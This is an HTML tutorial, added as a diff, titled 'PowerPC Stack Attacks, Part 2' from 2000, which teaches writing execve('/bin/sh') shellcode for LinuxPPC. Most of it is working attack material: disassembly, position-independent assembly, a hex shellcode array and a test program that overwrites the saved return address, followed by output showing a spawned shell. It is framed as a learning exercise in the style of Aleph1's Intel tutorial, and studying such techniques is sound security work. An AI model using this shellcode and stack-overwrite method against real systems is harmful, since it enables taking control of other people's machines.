@@ -1,0 +1,255 @@
+<html><head>
+<meta http-equiv="content-type" content="text/html; charset=windows-1252"></head><body>PowerPC Stack Attacks, Part 2 - June 1, 2000<br>
+Christopher A Shepherd &lt;cshepher@linux-florida.com&gt;<br>
+<br>
+In the last episode, we showed that it was possible to overwrite the return
+address with careful stack manipulation and execute the code of our choice.
+In this installment, we'll dig a bit deeper and write our own PowerPC
+eggshell code.
+<br><br>
+The first thing we want to do (and again folks, this really is a carbon copy
+of Aleph1's Intel-based explanation) is to run a sample program that spawns
+a shell, because presumably that's what our evil code will do. Thus:
+<br><pre>#include <stdio.h>
+
+void main() {
+        char *name[2];
+
+        name[0] = "/bin/sh";
+        name[1] = NULL;
+        execve( name[0], name, NULL );
+}
+</stdio.h></pre><br>
+Now, we compile this program using gcc -static, because we're also going to
+examine the internals of __execve, which would otherwise by dynamically
+linked, and thus harder to examine.
+<br><br>
+The main() itself looks like...
+<br><pre>main:
+        stwu 1,-32(1)           ; grab 32 bytes for stack frame
+        mflr 0                  ; r0 = return address
+        stw 31,28(1)            ; sp+28 = old frame pointer
+        stw 0,36(1)             ; sp+36 (caller's frame) = returrn address
+        mr 31,1                 ; fp = sp
+        lis 9,.LC0@ha           ; get high word in r9
+        la 0,.LC0@l(9)          ; get full longword in r0
+        stw 0,8(31)             ; fp+8 = ptr to '/bin/sh'
+        li 0,0
+        stw 0,12(31)            ; fp+12 = 0 (NULL)
+        lwz 3,8(31)             ; r3 = ptr to address of /bin/sh
+        addi 4,31,8             ; r4 = address of /bin/sh
+        li 5,0                  ; r5 = NULL
+        crxor 6,6,6
+        bl execve               ; execve()
+.L2:
+        lwz 11,0(1)             ; prologue... r11 = sp+0 = old stack ptr
+        lwz 0,4(11)             ; r0 = sp+4
+        mtlr 0                  ; grab old return address
+        lwz 31,-4(11)           ; grab old frame ptr
+        mr 1,11                 ; restore stack ptr
+        blr                     ; go home
+</pre><br>
+So notice that we find the address of "/bin/sh" and save it in r3. This is
+because the first argument is char *. The second argument is char **, so,
+did you guess this already? We save the address of the string somewhere and
+save the address of that address (**) in r4. We also stash a NULL pointer
+right after the valid pointer. This is the proper way to terminate a **.
+r5 gets set to 0, so apparently a NULL pointer on powerpc is expressed as a
+literal zero. Do not expect this on other arches.
+<br><br>
+Then, we just call execve, which looks like:
+<br><pre>10004f18 &lt;__execve&gt;:
+10004f18:       94 21 ff e0     stwu    r1,-32(r1)      ; grab 32 bytes
+10004f1c:       7c 08 02 a6     mflr    r0              ; r0 = old ret
+10004f20:       93 a1 00 14     stw     r29,20(r1)      ; sp+20 = r29
+10004f24:       93 c1 00 18     stw     r30,24(r1)      ; sp+24 = r30
+10004f28:       93 e1 00 1c     stw     r31,28(r1)      ; sp+28 = r31
+10004f2c:       90 01 00 24     stw     r0,36(r1)       ; sp+36 = ret
+10004f30:       3d 20 00 00     lis     r9,0            ; r9 = 0
+10004f34:       39 29 00 00     addi    r9,r9,0
+10004f38:       2c 09 00 00     cmpwi   r9,0
+10004f3c:       7c 7f 1b 78     mr      r31,r3          ; r31 = arg1 char*
+10004f40:       7c 9e 23 78     mr      r30,r4          ; r30 = arg2 char**
+10004f44:       7c bd 2b 78     mr      r29,r5          ; r29 = arg3 NULL
+10004f48:       41 82 00 08     beq     10004f50 &lt;__execve+0x38&gt;
+10004f4c:       4b ff b0 b5     bl      10000000 &lt;_start-0xc0&gt;
+10004f50:       7f e3 fb 78     mr      r3,r31          ; r3 = arg1 char*
+10004f54:       7f c4 f3 78     mr      r4,r30          ; r4 = arg2 char**
+10004f58:       7f a5 eb 78     mr      r5,r29          ; r5 = arg3 NULL
+10004f5c:       4c c6 31 82     crclr   4*cr1+eq
+10004f60:       48 00 00 f9     bl      10005058 &lt;__syscall_execve&gt;
+10004f64:       80 01 00 24     lwz     r0,36(r1)       ; prologue
+10004f68:       7c 08 03 a6     mtlr    r0
+10004f6c:       83 a1 00 14     lwz     r29,20(r1)
+10004f70:       83 c1 00 18     lwz     r30,24(r1)
+10004f74:       83 e1 00 1c     lwz     r31,28(r1)
+10004f78:       38 21 00 20     addi    r1,r1,32
+10004f7c:       4e 80 00 20     blr
+</pre><br>
+     ... And, sandwiched between that same old prologue and epilogue,
+there's not a lot there, is there? We just preserve r3, r4, and r5 and
+branch to syscall_execve, which just does ...
+<br><pre>10005058 &lt;__syscall_execve&gt;:            ; Stub for execve() syscall
+10005058:       38 00 00 0b     li      r0,11   ; execve is linux syscall 11
+1000505c:       44 00 00 02     sc              ; *boom* 'sc' system call
+10005060:       4c 83 00 20     bnslr           ; go home if no error
+10005064:       48 00 02 a8     b       1000530c &lt;__syscall_error&gt;
+</pre><br>
+    Sets r0 with the system call number (11, execve()), and does an 'sc' to
+software-interrupt us into the system call handler, and Linus and Alan take
+it from there.
+<br><br>
+    So, we know what we need to do here. Let's put it all together! The
+first thing to contend with is that our code must be relocatable, and
+therefore contain no absolute addresses. This is handled exactly the same
+way as on the Intel arch, by jumping to the end of the code and blr'ing back
+to the beginning (thus saving the absolute address of the end of the program
+in the link register) and allowing us to do our dirty work. Witness:
+<br><pre>void main()
+{
+__asm__("
+                b       .ahead  # get cmd's address
+.back:
+                mflr    0       # r0 = string /bin/sh
+                mr      1,0
+                stw     0,8(1)  # string+8 contains address of string now
+                mr      3,0     # r3 = ptr to /bin/sh
+                addi    4,1,8   # r4 = r1+8 = ptr to ptr
+                li      5,0     # r5 = NULL
+                stw     5,12(1) # null ptr in space after ptr
+                li      0,11    # syscall #11 - execve()
+                sc              # word to your moms. commence dropping bombs.
+                li      0,1     # syscall #1 - exit()
+                sc
+.ahead:
+                bl      .back   # this be our smoove branch
+                .string \"/bin/sh\"
+");
+}
+</pre><br>
+     Notice how the first instruction jumps to the end, and we then branch
+back, and use mflr to save the address of the string in r0. Notice too that,
+as Aleph1 suggests, I inserted a syscall #1 (exit()) after the syscall to
+prevent unpredictable behavior after execve() returns.
+<br><br>
+     Now, all we have to do is make this work. Let's look at the simplest
+test case:
+<br><pre>char shellcode[] =
+	"INSERT YO WAREZ HERE";
+
+void main() {
+        int *ret;
+
+        ret = (int *)&amp;ret + 7;
+        (*ret) = (int)shellcode;
+
+        printf("Hi there.\n");
+}
+</pre><br>
+     Notice that main() calls another function, in this case printf(),
+because as we said earlier, we don't get to fiddle with buffer overflows at
+all unless LR is preserved on the stack, which only occurs if we call
+another function. In case you're wondering why ret is set equal to &amp;ret + 7,
+let's have a quick look at the stack frame:
+<br><pre>main:
+        stwu 1,-32(1)
+        mflr 0
+        stw 31,28(1)
+        stw 0,36(1)
+        mr 31,1
+        addi 0,31,36
+        stw 0,8(31)
+</pre><br>
+     You've probably read enough of these by now to notice that our stack
+frame is only 32 bytes long, and that ret is 8 bytes up from the bottom of
+that frame. The 'addi' line here is a bit tricky on my toolchain:
+<br><br>
+     When I set ret = &amp;ret + 2, the addi line read:<br><pre>	addi 0,31,16
+</pre><br>
+     What's happening here is that if you were just setting ret to itself,
+you'd get addi 0,31,8, because r31+8 is where ret's value lives. But as you
+add values to ret, you're incrementing it in full words (4 bytes), thus
+8+(7*4) = 36.
+<br><br>
+     Now let's go back to that k-rad eggshell code we wrote earlier. It
+disassembles something like this:
+<br><pre>10010540:       48 00 00 30     b       10010570 &lt;shellcode+0x30&gt;
+10010544:       7c 08 02 a6     mflr    r0
+10010548:       7c 01 03 78     mr      r1,r0
+1001054c:       90 01 00 08     stw     r0,8(r1)
+10010550:       7c 03 03 78     mr      r3,r0
+10010554:       38 81 00 08     addi    r4,r1,8
+10010558:       38 a0 00 00     li      r5,0
+1001055c:       90 a1 00 0c     stw     r5,12(r1)
+10010560:       38 00 00 0b     li      r0,11
+10010564:       44 00 00 02     sc
+10010568:       38 00 00 01     li      r0,1
+1001056c:       44 00 00 02     sc
+10010570:       4b ff ff d5     bl      10010544 <shellcode+0x4>
+10010574:       2f 62 69 6e     cmpdi   cr6,r2,26990
+10010578:       2f 73 68 00     cmpdi   cr6,r19,26624
+1001057c:       ff ff ff ff     fnmadd. f31,f31,f31,f31
+10010580:       ff ff ff ff     fnmadd. f31,f31,f31,f31
+10010584:       ff ff ff ff     fnmadd. f31,f31,f31,f31
+10010588:       ff ff ff ff     fnmadd. f31,f31,f31,f31
+</shellcode+0x4></pre><br>
+     That's us allright. I put those ff's at the bottom as... yep, you got
+it, room to store the two pointers we generate in the code. Let's convert
+this to hex and plug it in:
+<br><pre>/*
+ *  Almost fully-functional LinuxPPC buffer overflow example
+ *
+ *  Christopher A Shepherd <cshepher@linux-florida.com>
+ *
+ */
+ 
+char shellcode[] =
+	"\x48\x00\x00\x30"	/*	b	.ahead	*/
+	"\x7c\x08\x02\xa6"	/*	mflr	0	*/
+	"\x7c\x01\x03\x78"	/*	mr	1,0	*/
+	"\x90\x01\x00\x08"	/*	stw	0,8(1)	*/
+	"\x7c\x03\x03\x78"	/*	mr	3,0	*/
+	"\x38\x81\x00\x08"	/*	addi	4,1,8	*/
+	"\x38\xa0\x00\x00"	/*	li	5,0	*/
+	"\x90\xa1\x00\x0c"	/*	stw	5,12(1)	*/	
+	"\x38\x00\x00\x0b"	/*	li	0,11	*/
+	"\x44\x00\x00\x02"	/*	sc		*/
+	"\x38\x00\x00\x01"	/*	li	0,1	*/
+	"\x44\x00\x00\x02"	/*	sc		*/
+	"\x4b\xff\xff\xd5"	/*	bl	.back	*/
+	"\x2f\x62\x69\x6e\x2f\x73\x68\x00"  /*   "/bin/sh" */
+	"\xff\xff\xff\xff"	/*	room for ptr	*/
+	"\xff\xff\xff\xff"
+	"\xff\xff\xff\xff"
+	"\xff\xff\xff\xff";
+	
+
+void main() {
+	int *ret;
+	
+	ret = (int *)&amp;ret + 7;
+	(*ret) = (int)shellcode;
+	
+	printf("Hi there.\n");
+}
+</cshepher@linux-florida.com></pre><br>
+     I don't know about you, but when I compiled and ran this, I got:
+<br><pre>[cshepher@hal9000 egg]$ ./sploit 
+Hi there.
+sh-2.03$
+</pre><br>
+     H0h0h0! We spawned a shell with our evil deed. We're almost there now,
+kids.
+<br><br>
+     In the third installment, we will talk about:
+<br><br>
+- Getting those pesky zeroes out of your eggshell code so that they don't
+  stop strcpy()<br>
+- The Mac OS X Server, Darwin, and OpenBSD stack frames on PowerPC<br>
+- All the hot chicks this is going to get me<br><br>
+
+     Stay tuned.<br><br>
+
+-Chris
+<br>
+</body></html>
